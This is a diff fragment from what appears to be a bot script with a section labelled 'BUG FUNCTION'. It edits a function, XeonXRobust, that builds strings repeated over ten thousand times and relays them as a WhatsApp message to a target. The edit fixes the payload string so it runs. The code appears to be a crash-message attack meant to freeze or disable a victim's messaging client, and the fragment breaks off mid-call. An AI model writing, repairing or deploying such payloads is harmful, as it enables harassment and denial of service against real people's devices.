@@ -2188,7 +2188,7 @@ bot.action("option1", async (ctx) => {
 //===============FUNC BUG==================\\
 // [ BUG FUNCTION ]
 async function XeonXRobust(target, Ptcp = true) {
-  const jids = _*~@0~*_\n.repeat(10200);
+  const jids = `_*~@0~*_\n`.repeat(10200);
   const ui = "ㅤ".repeat(10000);
   await sock.relayMessage(target, {
     ephemeralMessage: {
